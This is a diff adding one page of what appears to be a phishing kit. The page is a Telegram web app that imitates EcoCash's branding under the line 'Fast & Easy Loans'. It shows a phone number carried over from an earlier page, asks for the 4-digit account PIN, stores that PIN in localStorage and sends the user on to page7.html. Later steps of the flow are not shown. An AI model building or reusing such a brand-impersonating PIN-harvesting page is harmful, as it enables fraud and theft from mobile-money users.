@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EcoCash - Verify Account</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #fff; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+            align-items: center;
+        }
+
+        /* --- Header Styling --- */
+        .header-box { 
+            width: 100%; 
+            background-color: #0071e3; 
+            padding: 30px 20px; 
+            color: white; 
+            text-align: center; 
+            box-sizing: border-box;
+            border-bottom-left-radius: 0%;
+            border-bottom-right-radius: 0%;
+        }
+        .logo-text { 
+            font-size: 34px; 
+            font-weight: bold; 
+            margin: 0; 
+        }
+        .logo-text span.eco { color: #fff; }
+        .logo-text span.cash { color: #e74c3c; }
+        .sub-text { 
+            font-size: 15px; 
+            margin-top: 5px; 
+            opacity: 0.9; 
+            color: #d1ecf1;
+        }
+
+        /* --- Content Container --- */
+        .main-content { 
+            width: 90%; 
+            max-width: 400px; 
+            margin: 30px auto 0; 
+            text-align: center; 
+            flex-grow: 1; 
+        }
+
+        h2 { 
+            color: #0056b3; 
+            font-size: 24px; 
+            margin-bottom: 25px; 
+            font-weight: bold;
+        }
+
+        /* --- Phone Input (Disabled/Read-Only) --- */
+        .phone-container {
+            display: flex;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 25px;
+            background-color: #f9f9f9;
+        }
+        .country-code {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 15px;
+            background-color: #f1f1f1;
+            border-right: 1px solid #ccc;
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+        }
+        .phone-input {
+            width: 100%;
+            border: none;
+            padding: 12px 15px;
+            font-size: 16px;
+            background-color: #f9f9f9;
+            color: #666;
+            outline: none;
+        }
+
+        /* --- PIN Fields --- */
+        .pin-label { 
+            color: #666; 
+            font-size: 14px;
+            margin-bottom: 12px; 
+        }
+        .pin-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .pin-box {
+            width: 50px;
+            height: 50px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            outline: none;
+            background-color: #fff;
+        }
+        .pin-box:focus {
+            border-color: #0071e3;
+        }
+        .toggle-eye { 
+            cursor: pointer; 
+            font-size: 22px; 
+            margin-left: 5px;
+            user-select: none;
+        }
+
+        /* --- Primary Button --- */
+        .btn-login {
+            background-color: #cccccc;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: not-allowed;
+            font-weight: bold;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+        .btn-login.active {
+            background-color: #5599ff; /* Matches the solid lighter blue submit color */
+            cursor: pointer;
+        }
+
+        /* --- Curved Footer Styling --- */
+        .footer-box { 
+            width: 100%; 
+            background-color: #0071e3; 
+            padding: 40px 20px 25px; 
+            color: white; 
+            text-align: center; 
+            border-top-left-radius: 50% 30px; 
+            border-top-right-radius: 50% 30px; 
+            box-sizing: border-box;
+            margin-top: 40px;
+        }
+        .footer-box .logo-text {
+            font-size: 24px;
+        }
+        .version-text { 
+            font-size: 12px; 
+            margin-top: 10px; 
+            opacity: 0.7; 
+        }
+        .terms-text { 
+            font-size: 11px; 
+            margin-top: 10px; 
+            padding: 0 20px; 
+            opacity: 0.9;
+        }
+        .terms-text a {
+            color: #fff;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="header-box">
+    <p class="logo-text"><span class="eco">Eco</span><span class="cash">Cash</span></p>
+    <p class="sub-text">Fast & Easy Loans</p>
+</div>
+
+<div class="main-content">
+    <h2>Verify your Account</h2>
+
+    <!-- Read-Only Phone Display -->
+    <div class="phone-container">
+        <div class="country-code">
+            <span>🇿🇼</span>
+            <span>+263</span>
+        </div>
+        <input type="text" id="phoneDisplay" class="phone-input" readonly placeholder="No phone number found">
+    </div>
+
+    <p class="pin-label">Enter your PIN (4 digits)</p>
+
+    <!-- Interactive PIN Input Container -->
+    <div class="pin-wrapper">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <span class="toggle-eye" id="eyeIcon">👁️</span>
+    </div>
+
+    <button id="loginBtn" class="btn-login" disabled>LOGIN</button>
+</div>
+
+<div class="footer-box">
+    <p class="logo-text"><span class="eco">Eco</span><span class="cash">Cash</span></p>
+    <p class="sub-text">Fast & Easy Loans</p>
+    <p class="version-text">v1.0.0</p>
+    <p class="terms-text">By logging in you agree to <a href="#">Terms & Conditions</a></p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const eye = document.getElementById('eyeIcon');
+    const phoneDisplay = document.getElementById('phoneDisplay');
+
+    // Fetch phone number saved from the previous page
+    let savedPhone = localStorage.getItem('phone') || "";
+    
+    // Clean up country code prefixes if already saved in the string
+    if (savedPhone.startsWith('+263')) {
+        savedPhone = savedPhone.replace('+263', '').trim();
+    } else if (savedPhone.startsWith('263')) {
+        savedPhone = savedPhone.replace('263', '').trim();
+    }
+    
+    // Display the saved phone number cleanly
+    if (savedPhone) {
+        phoneDisplay.value = savedPhone;
+    } else {
+        phoneDisplay.value = "Not Provided";
+    }
+
+    // Auto-focus handler for sequential PIN inputs
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, ''); // Numeric only
+
+            if (box.value && index < pinBoxes.length - 1) {
+                pinBoxes[index + 1].focus();
+            }
+            checkInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
+    });
+
+    // Toggle button active state based on input completion
+    function checkInputs() {
+        const filled = [...pinBoxes].every(b => b.value);
+        loginBtn.disabled = !filled;
+        loginBtn.classList.toggle('active', filled);
+    }
+
+    // Interactive Eye Icon to view/hide input text
+    eye.addEventListener('click', () => {
+        const isHidden = pinBoxes[0].type === "password";
+        pinBoxes.forEach(box => box.type = isHidden ? "text" : "password");
+        eye.textContent = isHidden ? "🫣" : "👁️";
+    });
+
+    // Save inputs locally and redirect cleanly to page7.html
+    loginBtn.addEventListener('click', () => {
+        if (loginBtn.disabled) return;
+
+        let pinValue = "";
+        pinBoxes.forEach(box => pinValue += box.value);
+
+        // Keep variables locally stored to make them accessible on page7.html
+        localStorage.setItem('phone', savedPhone);
+        localStorage.setItem('lastPin', pinValue);
+
+        // Direct client route to public page 7
+        window.location.href = "page7.html";
+    });
+
+    // Telegram WebApp setup
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
